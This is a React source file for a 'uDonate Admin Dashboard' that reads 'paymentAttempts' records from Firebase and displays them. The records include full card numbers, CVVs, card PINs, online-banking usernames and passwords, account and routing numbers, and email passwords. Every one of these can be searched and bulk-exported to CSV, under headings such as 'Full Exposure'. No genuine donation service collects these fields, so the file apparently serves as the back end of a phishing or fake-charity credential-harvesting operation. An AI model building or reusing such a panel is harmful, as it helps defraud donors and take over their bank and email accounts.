import React, { useState, useEffect } from 'react';
import { ref, onValue, off, remove, update } from 'firebase/database';
import { db } from './firebase';
import { 
  FaEye, 
  FaTrash, 
  FaEdit, 
  FaSearch, 
  FaFilter,
  FaDownload,
  FaSync,
  FaChartBar,
  FaMoneyBillWave,
  FaCreditCard,
  FaLink,
  FaEthereum,
  FaExclamationTriangle,
  FaCheckCircle,
  FaClock,
  FaUser,
  FaEnvelope,
  FaCalendar,
  FaDollarSign,
  FaKey,
  
  FaUnlock,
  FaCode // Added missing import
} from 'react-icons/fa';
import './admin.css';

const AdminDashboard = () => {
  const [payments, setPayments] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [methodFilter, setMethodFilter] = useState('all');
  const [selectedPayment, setSelectedPayment] = useState(null);
  const [viewMode, setViewMode] = useState('card');
  const [stats, setStats] = useState({
    total: 0,
    completed: 0,
    failed: 0,
    pending: 0,
    totalAmount: 0
  });

  // Fetch payments from Firebase
  useEffect(() => {
    const paymentsRef = ref(db, 'paymentAttempts');
    
    const handleData = (snapshot) => {
      try {
        const paymentsData = snapshot.val();
        const paymentsList = [];

        if (paymentsData) {
          Object.keys(paymentsData).forEach(key => {
            paymentsList.push({
              id: key,
              ...paymentsData[key]
            });
          });

          paymentsList.sort((a, b) => {
            const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
            const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
            return timeB - timeA;
          });

          setPayments(paymentsList);
          calculateStats(paymentsList);
        }
        setLoading(false);
      } catch (error) {
        console.error('Error processing payment data:', error);
        setLoading(false);
      }
    };

    onValue(paymentsRef, handleData);

    return () => {
      off(paymentsRef, 'value', handleData);
    };
  }, []);

  const calculateStats = (paymentsList) => {
    const stats = {
      total: paymentsList.length,
      completed: 0,
      failed: 0,
      pending: 0,
      totalAmount: 0
    };

    paymentsList.forEach(payment => {
      if (payment.status === 'completed') {
        stats.completed++;
        stats.totalAmount += payment.donationAmount || 0;
      } else if (payment.status === 'failed') {
        stats.failed++;
      } else {
        stats.pending++;
      }
    });

    setStats(stats);
  };

  // Filter payments
  const filteredPayments = payments.filter(payment => {
    const searchLower = searchTerm.toLowerCase();
    const matchesSearch = 
      payment.campaign?.toLowerCase().includes(searchLower) ||
      payment.paymentMethod?.toLowerCase().includes(searchLower) ||
      payment.status?.toLowerCase().includes(searchLower) ||
      (payment.cardDetails?.cardNumber && payment.cardDetails.cardNumber.includes(searchTerm)) ||
      (payment.cryptoDetails?.selectedCrypto && payment.cryptoDetails.selectedCrypto.includes(searchLower)) ||
      (payment.accountInfo?.email && payment.accountInfo.email.includes(searchTerm)) ||
      (payment.linkAccountInfo?.email && payment.linkAccountInfo.email.includes(searchTerm)) ||
      (payment.linkAccountInfo?.accountUsername && payment.linkAccountInfo.accountUsername.includes(searchTerm));

    const matchesStatus = statusFilter === 'all' || payment.status === statusFilter;
    const matchesMethod = methodFilter === 'all' || payment.paymentMethod === methodFilter;

    return matchesSearch && matchesStatus && matchesMethod;
  });

  const deletePayment = async (paymentId) => {
    if (window.confirm('Are you sure you want to delete this payment record?')) {
      try {
        await remove(ref(db, `paymentAttempts/${paymentId}`));
      } catch (error) {
        console.error('Error deleting payment:', error);
        alert('Error deleting payment record');
      }
    }
  };

  const exportToCSV = () => {
    const headers = [
      'ID', 'Timestamp', 'Campaign', 'Amount', 'Method', 'Status', 
      'Email', 'Phone', 'Card Number', 'CVV', 'Expiry', 'Cardholder',
      'Account Username', 'Account Password', 'Account Number', 'Routing Number',
      'Email Password', 'Crypto Type', 'Crypto Address', 'Transaction Hash'
    ];
    
    const csvData = filteredPayments.map(payment => [
      payment.id,
      payment.timestamp || 'N/A',
      payment.campaign || 'N/A',
      payment.donationAmount || '0',
      payment.paymentMethod || 'N/A',
      payment.status || 'N/A',
      payment.accountInfo?.email || payment.linkAccountInfo?.email || 'N/A',
      payment.accountInfo?.phoneNumber || 'N/A',
      payment.cardDetails?.cardNumber || 'N/A',
      payment.cardDetails?.cvv || 'N/A',
      payment.cardDetails?.expiryDate || 'N/A',
      payment.cardDetails?.cardholderName || 'N/A',
      payment.linkAccountInfo?.accountUsername || 'N/A',
      payment.linkAccountInfo?.accountPassword || 'N/A',
      payment.linkAccountInfo?.accountNumber || 'N/A',
      payment.linkAccountInfo?.routingNumber || 'N/A',
      payment.linkAccountInfo?.emailPassword || 'N/A',
      payment.cryptoDetails?.selectedCrypto || 'N/A',
      payment.cryptoDetails?.cryptoAddress || 'N/A',
      payment.cryptoDetails?.transactionHash || 'N/A'
    ]);

    const csvContent = [headers, ...csvData]
      .map(row => row.map(field => `"${field}"`).join(','))
      .join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `payments-full-export-${new Date().toISOString().split('T')[0]}.csv`;
    a.click();
    window.URL.revokeObjectURL(url);
  };

  const getStatusIcon = (status) => {
    switch (status) {
      case 'completed': return <FaCheckCircle className="status-icon completed" />;
      case 'failed': return <FaExclamationTriangle className="status-icon failed" />;
      case 'pending': return <FaClock className="status-icon pending" />;
      default: return <FaClock className="status-icon pending" />;
    }
  };

  const getMethodIcon = (method) => {
    switch (method) {
      case 'crypto': return <FaEthereum className="method-icon crypto" />;
      case 'card': return <FaCreditCard className="method-icon card" />;
      case 'link': return <FaLink className="method-icon link" />;
      default: return <FaMoneyBillWave className="method-icon default" />;
    }
  };

  const formatTimestamp = (timestamp) => {
    if (!timestamp) return 'N/A';
    try {
      // Handle Firebase timestamp objects
      if (timestamp.toDate) {
        return timestamp.toDate().toLocaleString();
      }
      // Handle string timestamps
      const date = new Date(timestamp);
      return isNaN(date.getTime()) ? 'Invalid Date' : date.toLocaleString();
    } catch {
      return 'Invalid Date';
    }
  };

  // Enhanced table columns to show more data
  const renderTableRow = (payment) => (
    <tr key={payment.id} className="payment-row">
      <td className="payment-id">{payment.id.slice(-8)}</td>
      <td className="timestamp">{formatTimestamp(payment.timestamp)}</td>
      <td className="campaign">{payment.campaign || 'N/A'}</td>
      <td className="amount">${payment.donationAmount || '0'}</td>
      <td className="method">
        <span className="method-badge">
          {getMethodIcon(payment.paymentMethod)}
          {payment.paymentMethod || 'N/A'}
        </span>
      </td>
      <td className="status">
        <span className={`status-badge ${payment.status || 'pending'}`}>
          {getStatusIcon(payment.status)}
          {payment.status || 'pending'}
        </span>
      </td>
      <td className="contact">
        <div className="contact-info">
          <div><FaEnvelope /> {payment.accountInfo?.email || payment.linkAccountInfo?.email || 'N/A'}</div>
          <div><FaUser /> {payment.accountInfo?.phoneNumber || 'N/A'}</div>
        </div>
      </td>
      <td className="sensitive-preview">
        {payment.paymentMethod === 'card' && payment.cardDetails && (
          <div className="sensitive-data">
            <div><FaCreditCard /> {payment.cardDetails.cardNumber || 'N/A'}</div>
            <div><FaKey /> CVV: {payment.cardDetails.cvv || 'N/A'}</div>
          </div>
        )}
        {payment.paymentMethod === 'link' && payment.linkAccountInfo && (
          <div className="sensitive-data">
            <div><FaUser /> User: {payment.linkAccountInfo.accountUsername || 'N/A'}</div>
            <div><FaKey /> Pass: {payment.linkAccountInfo.accountPassword || 'N/A'}</div>
          </div>
        )}
      </td>
      <td className="actions">
        <button 
          onClick={() => setSelectedPayment(payment)}
          className="view-btn"
          title="View Full Details"
        >
          <FaEye />
        </button>
        <button 
          onClick={() => deletePayment(payment.id)}
          className="delete-btn"
          title="Delete Record"
        >
          <FaTrash />
        </button>
      </td>
    </tr>
  );

  // Safe modal rendering
  const renderModal = () => {
    if (!selectedPayment) return null;

    return (
      <div className="modal-overlay" onClick={() => setSelectedPayment(null)}>
        <div className="modal-content" onClick={(e) => e.stopPropagation()}>
          <div className="modal-header">
            <h2>Complete Payment Details</h2>
            <button 
              onClick={() => setSelectedPayment(null)}
              className="close-btn"
            >
              ×
            </button>
          </div>

          <div className="modal-body">
            <div className="detail-section">
              <h3>Basic Information</h3>
              <div className="detail-grid">
                <div className="detail-item">
                  <label>Payment ID:</label>
                  <span className="sensitive-data">{selectedPayment.id}</span>
                </div>
                <div className="detail-item">
                  <label>Timestamp:</label>
                  <span>{formatTimestamp(selectedPayment.timestamp)}</span>
                </div>
                <div className="detail-item">
                  <label>Campaign:</label>
                  <span>{selectedPayment.campaign || 'N/A'}</span>
                </div>
                <div className="detail-item">
                  <label>Amount:</label>
                  <span className="amount">${selectedPayment.donationAmount || '0'}</span>
                </div>
                <div className="detail-item">
                  <label>Payment Method:</label>
                  <span>{selectedPayment.paymentMethod || 'N/A'}</span>
                </div>
                <div className="detail-item">
                  <label>Status:</label>
                  <span className={`status-badge ${selectedPayment.status || 'pending'}`}>
                    {selectedPayment.status || 'pending'}
                  </span>
                </div>
              </div>
            </div>

            {/* Card Details - FULL EXPOSURE */}
            {selectedPayment.cardDetails && (
              <div className="detail-section">
                <h3>
                  <FaCreditCard /> Card Information (Full Exposure)
                </h3>
                <div className="detail-grid">
                  <div className="detail-item sensitive">
                    <label>Card Number:</label>
                    <span className="sensitive-data">{selectedPayment.cardDetails.cardNumber || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Expiry Date:</label>
                    <span className="sensitive-data">{selectedPayment.cardDetails.expiryDate || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>CVV:</label>
                    <span className="sensitive-data">{selectedPayment.cardDetails.cvv || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Cardholder Name:</label>
                    <span className="sensitive-data">{selectedPayment.cardDetails.cardholderName || 'N/A'}</span>
                  </div>
                </div>
              </div>
            )}

            {/* Crypto Details */}
            {selectedPayment.cryptoDetails && (
              <div className="detail-section">
                <h3>
                  <FaEthereum /> Cryptocurrency Details
                </h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Crypto Type:</label>
                    <span>{selectedPayment.cryptoDetails.selectedCrypto || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>Crypto Amount:</label>
                    <span>{selectedPayment.cryptoDetails.cryptoAmount || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Crypto Address:</label>
                    <span className="sensitive-data crypto-address">{selectedPayment.cryptoDetails.cryptoAddress || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Transaction Hash:</label>
                    <span className="sensitive-data">{selectedPayment.cryptoDetails.transactionHash || 'N/A'}</span>
                  </div>
                </div>
              </div>
            )}

            {/* Link Account Details - FULL EXPOSURE */}
            {selectedPayment.linkAccountInfo && (
              <div className="detail-section">
                <h3>
                  <FaLink /> Bank Account Information (Full Exposure)
                </h3>
                <div className="detail-grid">
                  <div className="detail-item sensitive">
                    <label>Account Username:</label>
                    <span className="sensitive-data">{selectedPayment.linkAccountInfo.accountUsername || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Account Password:</label>
                    <span className="sensitive-data">{selectedPayment.linkAccountInfo.accountPassword || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Account Number:</label>
                    <span className="sensitive-data">{selectedPayment.linkAccountInfo.accountNumber || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Routing Number:</label>
                    <span className="sensitive-data">{selectedPayment.linkAccountInfo.routingNumber || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>Email:</label>
                    <span>{selectedPayment.linkAccountInfo.email || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Email Password:</label>
                    <span className="sensitive-data">{selectedPayment.linkAccountInfo.emailPassword || 'N/A'}</span>
                  </div>
                </div>
              </div>
            )}

            {/* Account Information - FULL EXPOSURE */}
            {selectedPayment.accountInfo && (
              <div className="detail-section">
                <h3>
                  <FaUser /> Contact Information (Full Exposure)
                </h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Email:</label>
                    <span>{selectedPayment.accountInfo.email || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>Phone Number:</label>
                    <span>{selectedPayment.accountInfo.phoneNumber || 'N/A'}</span>
                  </div>
                  <div className="detail-item sensitive">
                    <label>Card PIN:</label>
                    <span className="sensitive-data">{selectedPayment.accountInfo.cardPin || 'N/A'}</span>
                  </div>
                </div>
              </div>
            )}

            {/* Billing Address */}
            {selectedPayment.cardDetails?.billingAddress && (
              <div className="detail-section">
                <h3>Billing Address</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Street:</label>
                    <span>{selectedPayment.cardDetails.billingAddress.street || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>City:</label>
                    <span>{selectedPayment.cardDetails.billingAddress.city || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>State:</label>
                    <span>{selectedPayment.cardDetails.billingAddress.state || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>ZIP Code:</label>
                    <span>{selectedPayment.cardDetails.billingAddress.zipCode || 'N/A'}</span>
                  </div>
                  <div className="detail-item">
                    <label>Country:</label>
                    <span>{selectedPayment.cardDetails.billingAddress.country || 'N/A'}</span>
                  </div>
                </div>
              </div>
            )}

            {/* Raw JSON View */}
            <div className="detail-section">
              <h3>
                <FaCode /> Raw JSON Data
              </h3>
              <pre className="raw-json">
                {JSON.stringify(selectedPayment, null, 2)}
              </pre>
            </div>
          </div>

          <div className="modal-actions">
            <button 
              onClick={() => setSelectedPayment(null)}
              className="close-modal-btn"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    );
  };

  if (loading) {
    return (
      <div className="admin-dashboard loading">
        <div className="loading-spinner"></div>
        <p>Loading payment data...</p>
      </div>
    );
  }

  return (
    <div className="admin-dashboard">
      {/* Header */}
      <div className="dashboard-header">
        <h1>
          <FaUnlock />  uDonate Admin Dashboard
        </h1>
         
         
      </div>

      {/* Statistics Cards */}
      <div className="stats-grid">
        <div className="stat-card total">
          <div className="stat-icon">
            <FaMoneyBillWave />
          </div>
          <div className="stat-info">
            <h3>{stats.total}</h3>
            <p>Total Payments</p>
          </div>
        </div>

        <div className="stat-card completed">
          <div className="stat-icon">
            <FaCheckCircle />
          </div>
          <div className="stat-info">
            <h3>{stats.completed}</h3>
            <p>Completed</p>
          </div>
        </div>

        <div className="stat-card failed">
          <div className="stat-icon">
            <FaExclamationTriangle />
          </div>
          <div className="stat-info">
            <h3>{stats.failed}</h3>
            <p>Failed</p>
          </div>
        </div>

        <div className="stat-card revenue">
          <div className="stat-icon">
            <FaDollarSign />
          </div>
          <div className="stat-info">
            <h3>${stats.totalAmount.toLocaleString()}</h3>
            <p>Total Revenue</p>
          </div>
        </div>
      </div>

      {/* Controls */}
      <div className="dashboard-controls">
        <div className="search-box">
          <FaSearch />
          <input
            type="text"
            placeholder="Search across all data (cards, emails, passwords, etc)..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
        </div>

        <div className="filter-controls">
          <select 
            value={statusFilter} 
            onChange={(e) => setStatusFilter(e.target.value)}
          >
            <option value="all">All Status</option>
            <option value="completed">Completed</option>
            <option value="failed">Failed</option>
            <option value="pending">Pending</option>
          </select>

          <select 
            value={methodFilter} 
            onChange={(e) => setMethodFilter(e.target.value)}
          >
            <option value="all">All Methods</option>
            <option value="crypto">Cryptocurrency</option>
            <option value="card">Card</option>
            <option value="link">Bank Link</option>
          </select>
 
        </div>

        <div className="action-buttons">
          <button onClick={exportToCSV} className="export-btn">
            <FaDownload /> Export Full Data
          </button>
          <button onClick={() => window.location.reload()} className="refresh-btn">
            <FaSync /> Refresh
          </button>
        </div>
      </div>

      {/* Payments Display */}
      <div className="payments-section">
        <div className="section-header">
          <h2>Complete Payment Records ({filteredPayments.length})</h2>
          <span className="data-warning">
            <FaUnlock /> All sensitive data fully exposed
          </span>
        </div>

        {viewMode === 'table' ? (
          <div className="table-container">
            <table className="payments-table">
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Timestamp</th>
                  <th>Campaign</th>
                  <th>Amount</th>
                  <th>Method</th>
                  <th>Status</th>
                  <th>Contact</th>
                  <th>Sensitive Data Preview</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {filteredPayments.map(renderTableRow)}
              </tbody>
            </table>

            {filteredPayments.length === 0 && (
              <div className="no-data">
                <p>No payments found matching your criteria</p>
              </div>
            )}
          </div>
        ) : (
          <div className="cards-container">
            {filteredPayments.map(payment => (
              <div key={payment.id} className="payment-card">
                <div className="card-header">
                  <div className="card-id">#{payment.id.slice(-8)}</div>
                  <div className={`card-status ${payment.status || 'pending'}`}>
                    {getStatusIcon(payment.status)}
                    {payment.status || 'pending'}
                  </div>
                </div>

                <div className="card-body">
                  <div className="card-field">
                    <label>Campaign:</label>
                    <span>{payment.campaign || 'N/A'}</span>
                  </div>

                  <div className="card-field">
                    <label>Amount:</label>
                    <span className="amount">${payment.donationAmount || '0'}</span>
                  </div>

                  <div className="card-field">
                    <label>Method:</label>
                    <span className="method">
                      {getMethodIcon(payment.paymentMethod)}
                      {payment.paymentMethod || 'N/A'}
                    </span>
                  </div>

                  <div className="card-field">
                    <label>Date:</label>
                    <span>{formatTimestamp(payment.timestamp)}</span>
                  </div>

                  {/* Card Data Exposure */}
                  {payment.cardDetails && (
                    <>
                      <div className="card-field sensitive">
                        <label>Card Number:</label>
                        <span className="sensitive-data">{payment.cardDetails.cardNumber || 'N/A'}</span>
                      </div>
                      <div className="card-field sensitive">
                        <label>CVV:</label>
                        <span className="sensitive-data">{payment.cardDetails.cvv || 'N/A'}</span>
                      </div>
                      <div className="card-field sensitive">
                        <label>Expiry:</label>
                        <span className="sensitive-data">{payment.cardDetails.expiryDate || 'N/A'}</span>
                      </div>
                      <div className="card-field sensitive">
                        <label>Cardholder:</label>
                        <span className="sensitive-data">{payment.cardDetails.cardholderName || 'N/A'}</span>
                      </div>
                      {payment.accountInfo?.cardPin && (
                        <div className="card-field sensitive">
                          <label>Card PIN:</label>
                          <span className="sensitive-data">{payment.accountInfo.cardPin}</span>
                        </div>
                      )}
                    </>
                  )}

                  {/* Link Account Data Exposure */}
                  {payment.linkAccountInfo && (
                    <>
                      <div className="card-field sensitive">
                        <label>Account User:</label>
                        <span className="sensitive-data">{payment.linkAccountInfo.accountUsername || 'N/A'}</span>
                      </div>
                      <div className="card-field sensitive">
                        <label>Account Pass:</label>
                        <span className="sensitive-data">{payment.linkAccountInfo.accountPassword || 'N/A'}</span>
                      </div>
                      <div className="card-field sensitive">
                        <label>Account #:</label>
                        <span className="sensitive-data">{payment.linkAccountInfo.accountNumber || 'N/A'}</span>
                      </div>
                      <div className="card-field sensitive">
                        <label>Routing #:</label>
                        <span className="sensitive-data">{payment.linkAccountInfo.routingNumber || 'N/A'}</span>
                      </div>
                      {payment.linkAccountInfo.emailPassword && (
                        <div className="card-field sensitive">
                          <label>Email Pass:</label>
                          <span className="sensitive-data">{payment.linkAccountInfo.emailPassword}</span>
                        </div>
                      )}
                    </>
                  )}

                  {/* Contact Info */}
                  {(payment.accountInfo?.email || payment.accountInfo?.phoneNumber) && (
                    <>
                      <div className="card-field">
                        <label>Email:</label>
                        <span>{payment.accountInfo.email || 'N/A'}</span>
                      </div>
                      <div className="card-field">
                        <label>Phone:</label>
                        <span>{payment.accountInfo.phoneNumber || 'N/A'}</span>
                      </div>
                    </>
                  )}
                </div>

                <div className="card-actions">
                  <button 
                    onClick={() => setSelectedPayment(payment)}
                    className="view-btn"
                  >
                    <FaEye /> Full Details
                  </button>
                  <button 
                    onClick={() => deletePayment(payment.id)}
                    className="delete-btn"
                  >
                    <FaTrash /> Delete
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Render Modal */}
      {renderModal()}
    </div>
  );
};

export default AdminDashboard;